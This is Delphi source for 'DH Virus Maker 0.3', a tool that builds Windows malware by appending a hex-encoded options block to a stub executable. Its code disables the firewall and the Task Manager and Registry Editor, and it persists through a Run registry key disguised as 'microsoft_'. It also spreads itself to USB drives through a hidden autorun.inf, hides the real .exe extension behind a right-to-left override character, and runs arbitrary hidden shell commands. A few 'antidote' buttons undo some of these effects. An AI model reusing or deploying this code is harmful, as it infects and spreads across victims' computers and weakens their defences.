// DH Virus Maker 0.3
// (C) Doddy Hackman 2015

unit maker;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls,
  Vcl.ExtCtrls, MadRes, StrUtils, Registry, Vcl.Imaging.pngimage;

type
  TForm1 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    StatusBar1: TStatusBar;
    GroupBox1: TGroupBox;
    GroupBox2: TGroupBox;
    Button1: TButton;
    disable_firewall: TCheckBox;
    reboot: TCheckBox;
    close_session: TCheckBox;
    change_text_taskbar: TCheckBox;
    execute: TCheckBox;
    disable_regedit: TCheckBox;
    hide_taskbar: TCheckBox;
    hide_icons: TCheckBox;
    open_cd: TCheckBox;
    sendkeys: TCheckBox;
    kill_process: TCheckBox;
    load_word: TCheckBox;
    crazy_mouse: TCheckBox;
    messagebox: TCheckBox;
    disable_taskmgr: TCheckBox;
    turn_off_monitor: TCheckBox;
    play_beeps: TCheckBox;
    crazy_hour: TCheckBox;
    usb_worm: TCheckBox;
    start_windows: TCheckBox;
    shutdown: TCheckBox;
    PageControl3: TPageControl;
    TabSheet9: TTabSheet;
    GroupBox10: TGroupBox;
    GroupBox14: TGroupBox;
    preview: TImage;
    GroupBox11: TGroupBox;
    Button2: TButton;
    ruta_icono: TEdit;
    icon_changer: TCheckBox;
    TabSheet11: TTabSheet;
    check_extension_changer: TCheckBox;
    GroupBox12: TGroupBox;
    check_extension: TCheckBox;
    extensiones: TComboBox;
    GroupBox13: TGroupBox;
    check_this_extension: TCheckBox;
    extension: TEdit;
    TabSheet12: TTabSheet;
    GroupBox18: TGroupBox;
    GroupBox19: TGroupBox;
    directorios: TComboBox;
    GroupBox20: TGroupBox;
    other_hide_file: TCheckBox;
    GroupBox3: TGroupBox;
    Button3: TButton;
    Button4: TButton;
    Button5: TButton;
    Button6: TButton;
    Button7: TButton;
    Button14: TButton;
    Button8: TButton;
    Button9: TButton;
    Image1: TImage;
    abrir_icono: TOpenDialog;
    TabSheet3: TTabSheet;
    GroupBox4: TGroupBox;
    Image2: TImage;
    Label1: TLabel;
    procedure change_text_taskbarClick(Sender: TObject);
    procedure executeClick(Sender: TObject);
    procedure sendkeysClick(Sender: TObject);
    procedure kill_processClick(Sender: TObject);
    procedure load_wordClick(Sender: TObject);
    procedure messageboxClick(Sender: TObject);
    procedure play_beepsClick(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button14Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure Button5Click(Sender: TObject);
    procedure Button6Click(Sender: TObject);
    procedure Button7Click(Sender: TObject);
    procedure Button8Click(Sender: TObject);
    procedure Button9Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;
  text_taskbar, command, sendkeys_text, process_pid, text_word,
    cantidad_mensaje, texto_mensaje, cantidad_beeps: string;

implementation

{$R *.dfm}
// Functions

function ejecutar(cmd: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  parte1: TSecurityAttributes;
  parte2: TStartupInfo;
  parte3: TProcessInformation;
  parte4: THandle;
  parte5: THandle;
  control2: Boolean;
  contez: array [0 .. 255] of AnsiChar;
  notengoidea: Cardinal;
  fix: Boolean;
  code: string;

begin

  code := '';

  with parte1 do
  begin
    nLength := SizeOf(parte1);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;

  CreatePipe(parte4, parte5, @parte1, 0);

  with parte2 do
  begin
    FillChar(parte2, SizeOf(parte2), 0);
    cb := SizeOf(parte2);
    dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
    wShowWindow := SW_HIDE;
    hStdInput := GetStdHandle(STD_INPUT_HANDLE);
    hStdOutput := parte5;
    hStdError := parte5;
  end;

  fix := CreateProcess(nil, Pchar('cmd.exe /C ' + cmd), nil, nil, True, 0, nil,
    Pchar('c:/'), parte2, parte3);

  CloseHandle(parte5);

  if fix then

    repeat

    begin
      control2 := ReadFile(parte4, contez, 255, notengoidea, nil);
    end;

    if notengoidea > 0 then
    begin
      contez[notengoidea] := #0;
      code := code + contez;
    end;

    until not(control2) or (notengoidea = 0);

  Result := code;

end;

function cambiar_barra(opcion: string): string;
var
  code: string;
begin
  code := '';

  if (opcion = 'hide') then
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE);
    code := '[?] Hidden Taskbar : OK';
  end
  else
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA);
    code := '[?] Show Taskbar : OK';
  end;

  Result := code;

end;

function cambiar_iconos(opcion: string): string;
var
  code: string;
  acatoy: THandle;
begin
  code := '';
  acatoy := FindWindow('ProgMan', nil);
  acatoy := GetWindow(acatoy, GW_CHILD);
  if (opcion = 'hide') then
  begin
    ShowWindow(acatoy, SW_HIDE);
    code := '[?] Hidden Icons : OK';
  end
  else
  begin
    ShowWindow(acatoy, SW_SHOW);
    code := '[?] Show Icons : OK';
  end;
  Result := code;
end;

function desactivar_firewall(os, opcion: string): string;
begin
  if (os = 'xp') then
  begin
    if (opcion = 'on') then
    begin
      ejecutar('netsh firewall set opmode enable');
    end;
    if (opcion = 'off') then
    begin
      ejecutar('netsh firewall set opmode disable');
    end;
  end;
  if (os = 'seven') then
  begin
    if (opcion = 'on') then
    begin
      ejecutar('netsh advfirewall set currentprofile state on');
    end;
    if (opcion = 'off') then
    begin
      ejecutar('netsh advfirewall set currentprofile state off');
    end;
  end;
  Result := '[+] Firewall Changed : OK';
end;

function regedit(opcion: string): string;
var
  make: TRegistry;
begin
  make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
  if (opcion = 'show') then
  begin
    make.WriteInteger('DisableRegistryTools', 0);
  end;
  if (opcion = 'hide') then
  begin
    make.WriteInteger('DisableRegistryTools', 1);
  end;
  make.Free;
  Result := '[+] Regedit Changed : OK';
end;

function edit_text_taskbar(opcion, texto: string): string;
var
  make: TRegistry;
begin
  make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey('Control Panel\International', True);
  if (opcion = 'enable') then
  begin
    make.WriteString('sShortTime', 'tt');
    make.WriteString('sTimeFormat', 'tt');
    make.WriteString('s1159', texto);
    make.WriteString('s2359', texto);
  end;
  if (opcion = 'disable') then
  begin
    make.WriteString('sShortTime', 'H:mm');
    make.WriteString('sTimeFormat', 'H:mm:ss');
    make.WriteString('s1159', '');
    make.WriteString('s2359', '');
  end;
  make.Free;
  Result := '[+] Taskbar Text : OK';
end;

function desactivar_tareas(opcion: string): string;
var
  admin: TRegistry;
begin
  admin := TRegistry.Create;
  admin.RootKey := HKEY_CURRENT_USER;
  admin.OpenKey
    ('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
  if opcion = 'off' then
  begin
    admin.WriteString('DisableTaskMgr', '1');
  end
  else
  begin
    admin.DeleteValue('DisableTaskMgr');
  end;
  admin.CloseKey;
  Result := '[+] Taskmgr : OK';
end;

function registry_start(option, path: string): string;
var
  registro: HKEY;
  admin: TRegistry;
begin
  if (option = 'on') then
  begin
    RegCreateKeyEx(HKEY_LOCAL_MACHINE,
      'Software\Microsoft\Windows\CurrentVersion\Run\', 0, nil,
      REG_OPTION_NON_VOLATILE, KEY_WRITE, nil, registro, nil);
    RegSetValueEx(registro, 'microsoft_', 0, REG_SZ, Pchar(path), 666);
    RegCloseKey(registro);
  end;
  if (option = 'off') then
  begin
    admin := TRegistry.Create;
    admin.RootKey := HKEY_LOCAL_MACHINE;
    admin.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run\', True);
    admin.DeleteValue('microsoft_');
    admin.CloseKey;
  end;

  Result := '[+] Startup : OK';
end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  AssignFile(ar, filename);
  FileMode := fmOpenWrite;

  if FileExists(filename) then
    Append(ar)
  else
    Rewrite(ar);

  Writeln(ar, texto);
  CloseFile(ar);

end;

function check_drive(target: string): Boolean;
var
  a, b, c: Cardinal;
begin
  Result := GetVolumeInformation(Pchar(target), nil, 0, @c, a, b, nil, 0);
end;

function usb_spread(opcion, path: string): string;
var
  unidad: Char;
  nombre: string;
begin

  if (opcion = 'on') then
  begin
    for unidad := 'C' to 'Z' do
    begin
      if (check_drive(Pchar(unidad + ':\')) = True) and
        (GetDriveType(Pchar(unidad + ':\')) = DRIVE_REMOVABLE) then
      begin
        CopyFile(Pchar(path),
          Pchar(unidad + ':\' + ExtractFileName(path)), True);
        nombre := ExtractFileName(path);
        nombre := StringReplace(nombre, '/', '', [rfReplaceAll, rfIgnoreCase]);
        savefile(unidad + ':\' + 'autorun.inf', '[autorun]');
        savefile(unidad + ':\' + 'autorun.inf', 'open=' + nombre);
        SetFileAttributes(Pchar(unidad + ':\' + 'autorun.inf'),
          FILE_ATTRIBUTE_HIDDEN);
        SetFileAttributes(Pchar(unidad + ':\' + ExtractFileName(path)),
          FILE_ATTRIBUTE_HIDDEN);

      end;
    end;
  end;

  if (opcion = 'off') then
  begin
    for unidad := 'C' to 'Z' do
    begin
      if (check_drive(Pchar(unidad + ':\')) = True) and
        (GetDriveType(Pchar(unidad + ':\')) = DRIVE_REMOVABLE) then
      begin
        DeleteFile(Pchar(unidad + ':\' + 'autorun.inf'));
        DeleteFile(Pchar(unidad + ':\' + ExtractFileName(path)));
      end;
    end;
  end;

  Result := '[+] USB Spread : OK';

end;

//

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

procedure extension_changer(archivo: string; extension: string);
var
  nombre: string;
begin
  nombre := ExtractFileName(archivo);
  nombre := StringReplace(nombre, ExtractFileExt(nombre), '',
    [rfReplaceAll, rfIgnoreCase]);
  nombre := nombre + Char(8238) + ReverseString('.' + extension) + '.exe';
  MoveFile(Pchar(archivo), Pchar(ExtractFilePath(archivo) + nombre));
end;

//

procedure TForm1.Button1Click(Sender: TObject);
var
  op_disable_firewall, op_shutdown, op_reboot, op_close_session,
    op_change_text_taskbar, op_execute, op_disable_regedit, op_hide_taskbar,
    op_hide_icons, op_crazy_hour, op_start_windows, op_open_cd, op_sendkeys,
    op_kill_process, op_load_word, op_crazy_mouse, op_messagebox,
    op_disable_taskmgr, op_turn_off_monitor, op_play_beeps, op_change_time,
    op_usb_spread, op_startup: string;
var
  op_directorios, op_other_hide_file: string;

var
  linea: string;
  aca: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  marca_uno: string;
  marca_dos: string;
  lineafinal: string;
  stubgenerado: string;
  tipodecarga: string;
  change: DWORD;
  valor: string;
  extensionacambiar: string;
  ruta_archivo: string;

begin

  if (disable_firewall.Checked) then
  begin
    op_disable_firewall := '1';
  end
  else
  begin
    op_disable_firewall := '0';
  end;

  if (shutdown.Checked) then
  begin
    op_shutdown := '1';
  end
  else
  begin
    op_shutdown := '0';
  end;

  if (reboot.Checked) then
  begin
    op_reboot := '1';
  end
  else
  begin
    op_reboot := '0';
  end;

  if (close_session.Checked) then
  begin
    op_close_session := '1';
  end
  else
  begin
    op_close_session := '0';
  end;

  if (change_text_taskbar.Checked) then
  begin
    op_change_text_taskbar := '1';
  end
  else
  begin
    op_change_text_taskbar := '0';
  end;

  if (execute.Checked) then
  begin
    op_execute := '1';
  end
  else
  begin
    op_execute := '0';
  end;

  if (disable_regedit.Checked) then
  begin
    op_disable_regedit := '1';
  end
  else
  begin
    op_disable_regedit := '0';
  end;

  if (hide_taskbar.Checked) then
  begin
    op_hide_taskbar := '1';
  end
  else
  begin
    op_hide_taskbar := '0';
  end;

  if (hide_icons.Checked) then
  begin
    op_hide_icons := '1';
  end
  else
  begin
    op_hide_icons := '0';
  end;

  if (crazy_hour.Checked) then
  begin
    op_crazy_hour := '1';
  end
  else
  begin
    op_crazy_hour := '0';
  end;

  if (start_windows.Checked) then
  begin
    op_start_windows := '1';
  end
  else
  begin
    op_start_windows := '0';
  end;

  if (open_cd.Checked) then
  begin
    op_open_cd := '1';
  end
  else
  begin
    op_open_cd := '0';
  end;

  if (sendkeys.Checked) then
  begin
    op_sendkeys := '1';
  end
  else
  begin
    op_sendkeys := '0';
  end;

  if (kill_process.Checked) then
  begin
    op_kill_process := '1';
  end
  else
  begin
    op_kill_process := '0';
  end;

  if (load_word.Checked) then
  begin
    op_load_word := '1';
  end
  else
  begin
    op_load_word := '0';
  end;

  if (crazy_mouse.Checked) then
  begin
    op_crazy_mouse := '1';
  end
  else
  begin
    op_crazy_mouse := '0';
  end;

  if (messagebox.Checked) then
  begin
    op_messagebox := '1';
  end
  else
  begin
    op_messagebox := '0';
  end;

  if (disable_taskmgr.Checked) then
  begin
    op_disable_taskmgr := '1';
  end
  else
  begin
    op_disable_taskmgr := '0';
  end;

  if (turn_off_monitor.Checked) then
  begin
    op_turn_off_monitor := '1';
  end
  else
  begin
    op_turn_off_monitor := '0';
  end;

  if (play_beeps.Checked) then
  begin
    op_play_beeps := '1';
  end
  else
  begin
    op_play_beeps := '0';
  end;

  if (crazy_hour.Checked) then
  begin
    op_change_time := '1';
  end
  else
  begin
    op_change_time := '0';
  end;

  if (start_windows.Checked) then
  begin
    op_startup := '1';
  end
  else
  begin
    op_startup := '0';
  end;

  if (usb_worm.Checked) then
  begin
    op_usb_spread := '1';
  end
  else
  begin
    op_usb_spread := '0';
  end;

  op_directorios := directorios.Text;

  if (other_hide_file.Checked) then
  begin
    op_other_hide_file := '1';
  end
  else
  begin
    op_other_hide_file := '0';
  end;

  lineafinal := '[disable_firewall]' + op_disable_firewall +
    '[disable_firewall]' + '[shutdown]' + op_shutdown + '[shutdown]' +
    '[reboot]' + op_reboot + '[reboot]' + '[close_session]' + op_close_session +
    '[close_session]' + '[change_text_taskbar]' + op_change_text_taskbar +
    '[change_text_taskbar]' + '[execute]' + op_execute + '[execute]' +
    '[disable_regedit]' + op_disable_regedit + '[disable_regedit]' +
    '[hide_taskbar]' + op_hide_taskbar + '[hide_taskbar]' + '[hide_icons]' +
    op_hide_icons + '[hide_icons]' + '[crazy_hour]' + op_crazy_hour +
    '[crazy_hour]' + '[start_windows]' + op_start_windows + '[start_windows]' +
    '[open_cd]' + op_open_cd + '[open_cd]' + '[sendkeys]' + op_sendkeys +
    '[sendkeys]' + '[kill_process]' + op_kill_process + '[kill_process]' +
    '[load_word]' + op_load_word + '[load_word]' + '[crazy_mouse]' +
    op_crazy_mouse + '[crazy_mouse]' + '[messagebox]' + op_messagebox +
    '[messagebox]' + '[disable_taskmgr]' + op_disable_taskmgr +
    '[disable_taskmgr]' + '[turn_off_monitor]' + op_turn_off_monitor +
    '[turn_off_monitor]' + '[play_beeps]' + op_play_beeps + '[play_beeps]' +
    '[usb_spread]' + op_usb_spread + '[usb_spread]' + '[change_time]' +
    op_change_time + '[change_time]' + '[startup]' + op_startup + '[startup]' +
    '[text_taskbar]' + text_taskbar + '[text_taskbar]' + '[command]' + command +
    '[command]' + '[sendkeys_text]' + sendkeys_text + '[sendkeys_text]' +
    '[process_pid]' + process_pid + '[process_pid]' + '[text_word]' + text_word
    + '[text_word]' + '[cantidad_mensaje]' + cantidad_mensaje +
    '[cantidad_mensaje]' + '[texto_mensaje]' + texto_mensaje + '[texto_mensaje]'
    + '[cantidad_beeps]' + cantidad_beeps + '[cantidad_beeps]' + '[hide_file]' +
    op_other_hide_file + '[hide_file]' + '[directory]' + op_directorios +
    '[directory]';

  // ShowMessage(lineafinal);

  stubgenerado := 'done.exe';

  marca_uno := '[63686175]' + dhencode(lineafinal, 'encode') + '[63686175]';

  aca := INVALID_HANDLE_VALUE;
  nose := 0;

  DeleteFile(stubgenerado);
  CopyFile(Pchar(ExtractFilePath(Application.ExeName) + '/' + 'Data/stub.exe'),
    Pchar(ExtractFilePath(Application.ExeName) + '/' + stubgenerado), True);

  linea := marca_uno;
  StrCopy(code, Pchar(linea));
  aca := CreateFile(Pchar(stubgenerado), GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, 0, 0);
  if (aca <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(aca, 0, nil, FILE_END);
    WriteFile(aca, code, 9999, nose, nil);
    CloseHandle(aca);
  end;

  ruta_archivo := stubgenerado;

  if (icon_changer.Checked) then
  begin
    try
      begin
        change := BeginUpdateResourceW
          (PWideChar(wideString(ruta_archivo)), FALSE);
        LoadIconGroupResourceW(change, PWideChar(wideString(valor)), 0,
          PWideChar(wideString(ruta_icono.Text)));
        EndUpdateResourceW(change, FALSE);
      end;
    except
      begin
        //
      end;
    end;
  end;

  if (check_extension_changer.Checked) then
  begin
    if not(check_extension.Checked and check_this_extension.Checked) then
    begin
      if (check_extension.Checked) then
      begin
        extensionacambiar := extensiones.Items[extensiones.ItemIndex];
        extension_changer(ruta_archivo, extensionacambiar);
      end;
      if (check_this_extension.Checked) then
      begin
        extension_changer(ruta_archivo, extension.Text);
      end;
    end;
  end;

  StatusBar1.Panels[0].Text := '[+] Done';
  StatusBar1.Update;

end;

procedure TForm1.Button2Click(Sender: TObject);
begin
  if abrir_icono.execute then
  begin
    preview.Picture.LoadFromFile(abrir_icono.filename);
    ruta_icono.Text := abrir_icono.filename;
  end;
end;

procedure TForm1.Button3Click(Sender: TObject);
begin
  desactivar_firewall('seven', 'on');
  StatusBar1.Panels[0].Text := '[+] Antidote applied';
  StatusBar1.Update;
end;

procedure TForm1.Button4Click(Sender: TObject);
begin
  regedit('show');
  StatusBar1.Panels[0].Text := '[+] Antidote applied';
  StatusBar1.Update;
end;

procedure TForm1.Button5Click(Sender: TObject);
begin
  cambiar_barra('show');
  StatusBar1.Panels[0].Text := '[+] Antidote applied';
  StatusBar1.Update;
end;

procedure TForm1.Button6Click(Sender: TObject);
begin
  cambiar_iconos('show');
  StatusBar1.Panels[0].Text := '[+] Antidote applied';
  StatusBar1.Update;
end;

procedure TForm1.Button7Click(Sender: TObject);
begin
  desactivar_tareas('on');
  StatusBar1.Panels[0].Text := '[+] Antidote applied';
  StatusBar1.Update;
end;

procedure TForm1.Button14Click(Sender: TObject);
begin
  registry_start('off', 'test');
  StatusBar1.Panels[0].Text := '[+] Antidote applied';
  StatusBar1.Update;
end;

procedure TForm1.Button8Click(Sender: TObject);
begin
  usb_spread('off', 'test');
  StatusBar1.Panels[0].Text := '[+] Antidote applied';
  StatusBar1.Update;
end;

procedure TForm1.Button9Click(Sender: TObject);
begin
  edit_text_taskbar('disable', 'test');
  StatusBar1.Panels[0].Text := '[+] Antidote applied';
  StatusBar1.Update;
end;

procedure TForm1.change_text_taskbarClick(Sender: TObject);
begin
  if (change_text_taskbar.Checked) then
  begin
    text_taskbar := InputBox('DH Virus Maker 0.3',
      'Write text to show : ', 'PWNED');
  end;
end;

procedure TForm1.executeClick(Sender: TObject);
begin
  if (execute.Checked) then
  begin
    command := InputBox('DH Virus Maker 0.3', 'Write command : ', '');
  end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin

  abrir_icono.InitialDir := GetCurrentDir;
  abrir_icono.Filter := 'ICO|*.ico|';
end;

procedure TForm1.kill_processClick(Sender: TObject);
begin
  if (kill_process.Checked) then
  begin
    process_pid := InputBox('DH Virus Maker 0.3', 'Write PID : ', '');
  end;
end;

procedure TForm1.load_wordClick(Sender: TObject);
begin
  if (load_word.Checked) then
  begin
    text_word := InputBox('DH Virus Maker 0.3', 'Write text : ', '');
  end;
end;

procedure TForm1.messageboxClick(Sender: TObject);
begin
  if (messagebox.Checked) then
  begin
    cantidad_mensaje := InputBox('DH Virus Maker 0.3', 'Write count : ', '');
    texto_mensaje := InputBox('DH Virus Maker 0.3', 'Write text : ', '');
  end;
end;

procedure TForm1.play_beepsClick(Sender: TObject);
begin
  if (play_beeps.Checked) then
  begin
    cantidad_beeps := InputBox('DH Virus Maker 0.3', 'Write count : ', '');
  end;
end;

procedure TForm1.sendkeysClick(Sender: TObject);
begin
  if (sendkeys.Checked) then
  begin
    sendkeys_text := InputBox('DH Virus Maker 0.3', 'Write text : ', '');
  end;
end;

end.

// The End ?
